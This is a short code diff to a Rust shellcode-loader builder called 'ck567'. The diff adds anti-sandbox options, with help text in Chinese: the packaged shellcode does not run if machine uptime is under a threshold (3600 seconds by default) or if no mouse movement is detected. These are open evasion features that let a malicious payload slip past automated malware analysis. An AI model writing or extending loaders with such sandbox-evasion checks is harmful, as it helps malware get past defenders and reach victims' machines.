@@ -34,7 +34,7 @@ fn main() {
                 ░ ░      ░  ░
                 ░
 ");
-    println!("version:0.2");
+    println!("version:0.3");
 
     let matches = Command::new("ck567")
         .subcommands([
@@ -68,7 +68,17 @@ fn main() {
                         .short('i')
                         .help("exe ico")
                         .required(false)
-                )
+                ).arg(
+                Arg::new("opTime")
+                    .short('t')
+                    .help("反沙盒：计算机运⾏时间 默认3600s 单位:秒 如果当前计算机小于 该参数则不执行。 op-time<0则 不检测")
+                    .required(false)
+            ).arg(
+                Arg::new("mouseMovementDetection")
+                    .short('m')
+                    .help("反沙盒： 鼠标移动检测 如果当前计算机 鼠标没有移动过则不执行")
+                    .required(false)
+            )
         ]
         )
         .get_matches();
@@ -82,8 +92,11 @@ fn main() {
         } else {
             ico = String::new();
         }
+        let string = String::from("3600");
+        let op_time = sub_m.get_one::<String>("opTime").or_else(||Some(&string)).unwrap().clone();
+        let mouse_movement_detection = sub_m.get_one::<bool>("mouseMovementDetection").or_else(||Some(&true)).unwrap().clone();
 
-        let shell_code_loader = ShellCodeHandler { file_path: fp, package_name: name, ico };
+        let shell_code_loader = ShellCodeHandler { file_path: fp, package_name: name, ico, op_time:op_time.clone().parse().unwrap(), mouse_movement_detection };
         shell_code_loader.load();
     } else if let Some(sub_m_1) = matches.subcommand_matches("bundle") {
         let fp = sub_m_1.get_one::<String>("file").unwrap().clone();
